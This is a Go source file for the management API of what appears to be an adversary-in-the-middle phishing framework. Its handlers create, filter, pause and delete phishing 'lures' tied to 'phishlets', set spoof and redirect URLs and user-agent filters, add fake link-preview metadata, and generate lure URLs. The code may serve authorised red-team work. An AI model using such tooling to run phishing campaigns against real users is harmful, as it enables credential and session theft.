package api

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/sdk"
)

func (r *Router) listLures(w http.ResponseWriter, req *http.Request) {
	limit, offset := parsePagination(req)
	phishlet := req.URL.Query().Get("phishlet")

	all, err := r.lures.List()
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}

	var filtered []*aitm.Lure
	for _, l := range all {
		if phishlet == "" || l.Phishlet == phishlet {
			filtered = append(filtered, l)
		}
	}

	total := len(filtered)
	start := min(offset, total)
	end := min(start+limit, total)
	page := filtered[start:end]

	items := make([]sdk.LureResponse, len(page))
	for i, l := range page {
		items[i] = lureToResponse(l)
	}
	writeJSON(w, http.StatusOK, sdk.PaginatedResponse[sdk.LureResponse]{
		Items:  items,
		Total:  total,
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) createLure(w http.ResponseWriter, req *http.Request) {
	body, ok := decodeAndValidate[sdk.CreateLureRequest](w, req)
	if !ok {
		return
	}

	path := body.Path
	if path == "" {
		path = randomPath()
	}

	lure := &aitm.Lure{
		Phishlet:    body.Phishlet,
		BaseDomain:  body.BaseDomain,
		Path:        path,
		RedirectURL: body.RedirectURL,
		SpoofURL:    body.SpoofURL,
		UAFilter:    body.UAFilter,
		OGTitle:     body.OGTitle,
		OGDesc:      body.OGDesc,
		OGImage:     body.OGImage,
		OGURL:       body.OGURL,
		Redirector:  body.Redirector,
	}
	if err := r.lures.Create(lure); err != nil {
		status, _ := errStatus(err)
		writeError(w, status, err.Error())
		return
	}
	writeJSON(w, http.StatusCreated, lureToResponse(lure))
}

func (r *Router) updateLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	lure, err := r.lures.Get(id)
	if err != nil {
		status, _ := errStatus(err)
		writeError(w, status, "lure not found")
		return
	}

	body, ok := decodeAndValidate[sdk.UpdateLureRequest](w, req)
	if !ok {
		return
	}
	if body.UAFilter != nil {
		lure.UAFilter = *body.UAFilter
	}
	if body.RedirectURL != nil {
		lure.RedirectURL = *body.RedirectURL
	}
	if body.SpoofURL != nil {
		lure.SpoofURL = *body.SpoofURL
	}
	if body.OGTitle != nil {
		lure.OGTitle = *body.OGTitle
	}
	if body.OGDesc != nil {
		lure.OGDesc = *body.OGDesc
	}
	if body.OGImage != nil {
		lure.OGImage = *body.OGImage
	}
	if body.OGURL != nil {
		lure.OGURL = *body.OGURL
	}
	if body.Redirector != nil {
		lure.Redirector = *body.Redirector
	}

	if err := r.lures.Update(lure); err != nil {
		status, _ := errStatus(err)
		writeError(w, status, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, lureToResponse(lure))
}

func (r *Router) deleteLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	if err := r.lures.Delete(id); err != nil {
		status, _ := errStatus(err)
		writeError(w, status, err.Error())
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (r *Router) generateLureURL(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	lure, err := r.lures.Get(id)
	if err != nil {
		status, _ := errStatus(err)
		writeError(w, status, "lure not found")
		return
	}

	var body sdk.GenerateURLRequest
	// Body is optional; ignore decode errors.
	json.NewDecoder(req.Body).Decode(&body)

	url, err := lure.GenerateURL(r.domain, body.Params)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, sdk.GenerateURLResponse{URL: url})
}

func (r *Router) pauseLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")

	body, ok := decodeAndValidate[sdk.PauseLureRequest](w, req)
	if !ok {
		return
	}
	d, _ := time.ParseDuration(body.Duration)

	if err := r.lures.Pause(id, d); err != nil {
		status, _ := errStatus(err)
		writeError(w, status, err.Error())
		return
	}
	lure, err := r.lures.Get(id)
	if err != nil {
		status, _ := errStatus(err)
		writeError(w, status, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, lureToResponse(lure))
}

func (r *Router) unpauseLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	if err := r.lures.Unpause(id); err != nil {
		status, _ := errStatus(err)
		writeError(w, status, err.Error())
		return
	}
	lure, err := r.lures.Get(id)
	if err != nil {
		status, _ := errStatus(err)
		writeError(w, status, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, lureToResponse(lure))
}

func lureToResponse(l *aitm.Lure) sdk.LureResponse {
	return sdk.LureResponse{
		ID:          l.ID,
		Phishlet:    l.Phishlet,
		BaseDomain:  l.BaseDomain,
		Hostname:    l.Hostname,
		Path:        l.Path,
		RedirectURL: l.RedirectURL,
		SpoofURL:    l.SpoofURL,
		UAFilter:    l.UAFilter,
		PausedUntil: pausedUntil(l),
		OGTitle:     l.OGTitle,
		OGDesc:      l.OGDesc,
		OGImage:     l.OGImage,
		OGURL:       l.OGURL,
		Redirector:  l.Redirector,
	}
}

func pausedUntil(l *aitm.Lure) *time.Time {
	if l.PausedUntil.IsZero() {
		return nil
	}
	return &l.PausedUntil
}


func randomPath() string {
	b := make([]byte, 6)
	rand.Read(b)
	return "/" + hex.EncodeToString(b)
}
